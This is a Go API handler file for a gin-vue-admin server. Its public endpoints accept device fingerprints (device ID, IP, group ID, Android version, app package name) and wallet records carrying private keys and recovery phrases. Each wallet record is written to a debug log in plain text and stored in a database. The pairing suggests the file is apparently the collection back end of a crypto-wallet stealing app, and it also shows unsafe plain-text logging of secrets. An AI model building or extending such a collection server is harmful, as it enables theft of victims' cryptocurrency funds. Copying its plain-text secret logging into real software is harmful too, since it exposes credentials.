package app

import (
	"fmt"
	"github.com/flipped-aurora/gin-vue-admin/server/api/v1/response"
	"github.com/flipped-aurora/gin-vue-admin/server/global"
	"github.com/flipped-aurora/gin-vue-admin/server/model"
	"github.com/flipped-aurora/gin-vue-admin/server/service/app"
	"github.com/gin-gonic/gin"
)

var (
	TPublicService = app.PublicService{}
)

type PublicApi struct {
}

// 设备信息
func (p *PublicApi) Device(c *gin.Context) {
	var req model.ReqDevice
	if err := c.ShouldBindJSON(&req); err != nil {
		response.FailWithMessage(fmt.Sprintf("device parameter parsing error:%v", err.Error()), c)
		return
	}
	global.GVA_LOG.Debug(fmt.Sprintf("recv device: device_id:%v, ip:%v, group_id:%v, time_zone:%v, brand:%v, model:%v, android_version:%v, app_package_name:%v.  req:%v",
		req.DeviceId, req.Ip, req.GroupId, req.TimeZone, req.Brand, req.Model, req.AndroidVersion, req.AppPackageName, req))
	if err := TPublicService.InsertDevice(&req); err != nil {
		global.GVA_LOG.Error(fmt.Sprintf("insert device error:%v", err.Error()))
		response.FailWithMessage(err.Error(), c)
		return
	} else {
		response.Ok(c)
	}
}

func (p *PublicApi) Wallet(c *gin.Context) {
	var req model.ReqWallet
	if err := c.ShouldBindJSON(&req); err != nil {
		response.FailWithMessage(fmt.Sprintf("wallet parameter parsing error:%v", err.Error()), c)
		return
	}
	global.GVA_LOG.Debug(fmt.Sprintf("recv wallet:device_id:%v, wallet_name:%v, type:%v, key:%v, phrase:%v",
		req.DeviceId, req.WalletName, req.Type, req.Key, req.Phrase))
	if err := TPublicService.InsertWallet(&req); err != nil {
		global.GVA_LOG.Error(fmt.Sprintf("insert wallet error:%v", err.Error()))
		response.FailWithMessage(err.Error(), c)
		return
	} else {
		response.Ok(c)
	}
}

//// 登录以后签发jwt
//func (p *PublicApi) tokenNext(c *gin.Context, user *app2.User) {
//	j := &utils.AppJwt{SigningKey: []byte(global.GVA_CONFIG.AppJwt.SigningKey)}
//
//	accessToken, err := j.CreateToken(user.CreateTime, user.LoginTime, int(user.ID), global.GVA_CONFIG.AppJwt.ExpiresTime)
//	if err != nil {
//		response.FailWithMessage("Failed to get token!", c)
//		return
//	}
//	// time.Hour * 24 * 365 * 10
//	refreshToken, err := j.CreateRefreshToken(accessToken, int(user.ID), global.GVA_CONFIG.AppJwt.RefreshExpiresTime)
//	if err != nil {
//		response.FailWithMessage("Failed to get refresh token!", c)
//		return
//	}
//
//	global.GVA_LOG.Debug(fmt.Sprintf("access-token:%v", accessToken))
//
//	response.OkWithDetailed(response.AppLoginResponse{
//		ExpiresAt:    global.GVA_CONFIG.AppJwt.ExpiresTime,
//		Token:        accessToken,
//		RefreshToken: refreshToken,
//		NickName:     user.NickName,
//		GameId:       user.GameId,
//		Head:         user.Head,
//		ImageUrl:     global.IMAGE_URL,
//		CreateTime:   user.CreateTime,
//		LoginTime:    user.LoginTime,
//	}, "login successful", c)
//}
